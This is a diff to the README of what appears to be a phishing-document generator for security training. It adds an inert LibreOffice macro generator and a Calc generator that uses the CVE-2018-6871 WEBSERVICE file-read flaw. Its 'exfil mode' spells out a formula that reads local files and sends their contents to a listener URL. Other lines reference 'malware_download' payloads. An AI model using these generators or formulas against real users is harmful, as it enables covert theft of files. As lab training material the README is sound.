@@ -25,10 +25,10 @@ It discovers available templates and macro payloads from the folders and lets yo
 For a non-interactive one-liner, pass the file type, template filename, and macro payload filename:
 
 ```text
-python main.py writer Vyplatka.odt test.txt
-python main.py word Handover_Protocol.docx malware_download.txt
-python main.py excel Weekly_Task_Tracker.xlsx malware_download.txt
-python main.py powerpoint Project_Status_Report_EN.pptx malware_download.txt
+python main.py writer Vyplatka.odt training_simulation.bas
+python main.py word Handover_Protocol.docx agent_download.txt
+python main.py excel Weekly_Task_Tracker.xlsx agent_download.txt
+python main.py powerpoint Project_Status_Report_EN.pptx agent_download.txt
 ```
 
 ```text
@@ -39,6 +39,99 @@ python generators/powerpoint_file_generator.py <template_name> <macro_name>
 ```
 
 Word, Excel, and PowerPoint templates are read from `templates/files/ms_office`; Writer templates are read from `templates/files/libre_office`.
+
+LibreOffice payloads must be `.bas` files containing an inert, manually started
+Basic procedure. The generator embeds the source in the document's `Standard`
+library, but does not configure an open event or execute it. Shell, network,
+file-changing, process-launch, and autorun patterns are rejected. The old
+LibreOffice `test.txt` payload is not a Basic macro and is intentionally not
+offered by the interactive menu.
+
+### Safe LibreOffice training generator
+
+For a passive LibreOffice Writer training artifact, use the dedicated safe
+generator:
+
+```text
+python main.py libreoffice-training --include-safe-macro
+```
+
+This creates `output/Security_Awareness_Exercise.odt` and, when requested, a
+companion `output/Security_Awareness_Exercise.bas`. The ODT contains no
+embedded or autorun macro. The companion Basic source is intentionally inert:
+it only checks for `C:\\vycvikove_stredisko.txt` or
+`/vycvikove_stredisko.txt` when started manually and displays a message. It
+does not execute commands, modify files, or make network connections.
+
+The generator can also be called directly:
+
+```text
+python generators/libreoffice_training_generator.py \
+  --output output/security_exercise.odt \
+  --title "Security Awareness Exercise Notice" \
+  --include-safe-macro
+```
+
+The older macro-import generators and payload templates are not used by this
+safe training path.
+
+### Calc WEBSERVICE file-read generator
+
+For a LibreOffice Calc training artifact that demonstrates the
+`WEBSERVICE("file://...")` local-file-read primitive (CVE-2018-6871), use:
+
+```text
+python main.py calc --output webservice_exercise.fods \
+  --files "C:\path\to\file.txt" "/etc/hosts"
+python generators/calc_file_generator.py \
+  --output output/webservice_exercise.fods \
+  --files "C:\path\to\file.txt" "/etc/hosts"
+```
+
+Each requested path becomes a cell with `=WEBSERVICE("file:///...")`. When the
+sheet is opened in the pinned LibreOffice 5.4.4 lab build, the formula reads
+the file and returns its text into the cell.
+
+#### Exfiltration mode
+
+Add `--mode exfil` to read each file and send its text to a listener by
+concatenating the URL-encoded result into a second request:
+
+```text
+python main.py calc --mode exfil --files "C:\path\to\secret.txt"
+python generators/calc_file_generator.py --mode exfil \
+  --files "C:\path\to\secret.txt" "/etc/hosts"
+```
+
+This emits, per file:
+
+```text
+=WEBSERVICE("http://<listener>/?f=<name>&d=" & ENCODEURL(WEBSERVICE("file:///...")))
+```
+
+The listener URL is read from `app.webservice.exfil_url` in `config.yml`
+(default `http://127.0.0.1:8080/exfil`) and can be overridden with
+`--exfil-url`. The receiving side sees a GET whose `f` parameter is the file
+name and whose `d` parameter is the URL-encoded file text.
+
+Scope and safety:
+
+* Read-only file access: formulas read files; they do not modify files, launch
+  processes, or execute code.
+* Exfil mode is an outbound GET to the listener you configure. Point it only
+  at a host you control for the exercise. There is no code execution and no
+  download-and-execute stage.
+* No privilege escalation: only files the LibreOffice process account can
+  already read are returned.
+* Authorized lab/training use only. LibreOffice 5.4.5+ / 6.0.2+ restrict
+  WEBSERVICE to http(s) and reject file://, so this artifact targets the
+  deliberately pinned 5.4.4 build.
+* Keep exfiltrated files small: WEBSERVICE returns a limited amount of text
+  and very long URLs are commonly rejected by the listener.
+
+If a cell does not refresh on open, recalculate with Ctrl+Shift+F9 or set
+Tools > Options > Calc > Formula > Recalculation on File Load to
+"Always recalculate".
 
 
 #### Setup
